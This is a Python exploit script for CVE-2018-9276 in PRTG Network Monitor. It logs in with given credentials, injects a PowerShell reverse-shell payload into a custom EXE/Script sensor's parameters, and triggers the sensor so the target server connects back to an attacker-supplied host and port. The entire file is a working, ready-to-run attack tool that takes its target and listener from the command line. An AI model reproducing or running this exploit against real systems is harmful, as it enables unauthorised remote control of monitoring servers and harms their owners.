import socket
import subprocess
import base64
import random
import requests
import lxml.html
import argparse
import string
import sys
from log_colors import *

# CVE-2018-9276
# Authenticated PRTG Network Monitor RCE
class CVE2018_9276:
    headers = {"User-Agent": "Mozilla/5.0"}

    def __init__(self, url, user, passwd, lhost, lport):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.user, self.passwd = user, passwd
        self.s = requests.Session()
        self.s.headers.update(self.headers)

    # login 
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        params = {"loginurl" : "", "username" : self.user, "password" : self.passwd}
        try:
            r = self.s.post(self.url + "/public/checklogin.htm", params = params)
            if "welcome.htm" in r.url:
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "login failed :(" + LogColors.ENDC)
                sys.exit()
        except Exception as e:
            print (LogColors.RED + "login failed :(" + LogColors.ENDC)
            sys.exit()

    # generate payload with reverse shell
    def generate_payload(self):
        print (LogColors.BLUE + "generate reverse shell payload..." + LogColors.ENDC)
        payload = ";$client = New-Object System.Net.Sockets."
        payload += "TCPClient('" + self.lhost + "'," + self.lport + ");"
        payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        payload += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
        print (LogColors.YELLOW + payload + LogColors.ENDC)
        print (LogColors.GREEN + "rev shell payload successfully generated :)" + LogColors.ENDC)
        return payload

    # add sensor
    def add_sensor(self):
        print (LogColors.BLUE + "adding sensor..." + LogColors.ENDC)
        rand_id = str(random.randint(100, 9999))
        params = {
            "name_": "Custom EXE/Script Sensor",
            "parenttags_": "C_OS_VMware",
            "tags_": "exesensor",
            "priority_": "3",
            "exefile_": "Demo Powershell Script - Available MB via WMI.ps1|Demo+Powershell Script - Available MB via WMI.ps1||",
            "exefilelabel": "",
            "exeparams_": self.generate_payload(),
            "environment_": "0",
            "usewindowsauthentication_": "0",
            "mutexname_": "",
            "timeout_": "60",
            "valuetype_": "0",
            "channel_": "Value",
            "unit_": "#",
            "monitorchange_": "0",
            "writeresult_": "0",
            "intervalgroup": "0",
            "intervalgroup": "1",
            "interval_": "60%7C60+seconds",
            "errorintervalsdown_": "1",
            "inherittriggers": "1",
            "id": "2004",
            "sensortype": "exe",
            "tmpid": rand_id
        }
        try:
            r = self.s.post(self.url + "/addsensor5.htm", params = params)
        except Exception:
            print (LogColors.RED + "failed to add sensor :(" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.YELLOW + "successfully add sensor..." + LogColors.ENDC)
    
    # parse sensor id
    def parse_sensor_id(self):
        import re
        print (LogColors.BLUE + "parsing sensor id..." + LogColors.ENDC)
        try:
            r = self.s.get(self.url + "/sensors.htm")
            sensor_id = re.findall('sensor.htm\?id=([0-9]{4})">Custom EXE/Script Sensor', r.text)[-1]
        except Exception as e:
            print (str(e))
            print (LogColors.RED + "failed to parse sensor id :(" + LogColors.ENDC)
            sys.exit()
        else:
            self.sensor_id = sensor_id
            print (LogColors.YELLOW + "sensor id: " + sensor_id + LogColors.ENDC)

    # send sensor id
    def send_sensor_id(self):
        print (LogColors.BLUE + "send sensor id..." + LogColors.ENDC)
        params = {"id" : self.sensor_id}
        try:
            r = self.s.post(self.url + "/api/scannow.htm", params = params) 
        except Exception:
            print (LogColors.RED + "failed exploitation PRTG  :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                print (LogColors.GREEN + "successfully exploited. hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed exploitation PRTG  :(" + LogColors.ENDC)
                sys.exit()

    # exploit
    def exploit(self):
        self.login()
        self.add_sensor()
        self.parse_sensor_id()
        self.send_sensor_id()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target PRTG Network Monitor ip/host")
    parser.add_argument('-U','--username', required = True, help = "PRTG Network Monitor username")
    parser.add_argument('-P','--password', required = True, help = "PRTG Network Monitor password")
    parser.add_argument('-i','--lhost', required = True, help = "local host for rev sh")
    parser.add_argument('-p','--lport', required = True, help = "local port for rev sh", default = '4444')
    args = vars(parser.parse_args())
    url = args['url']
    usr, passwd = args['username'], args['password']
    lhost, lport = args['lhost'], args['lport']
    cve = CVE2018_9276(url, usr, passwd, lhost, lport)
    cve.exploit()


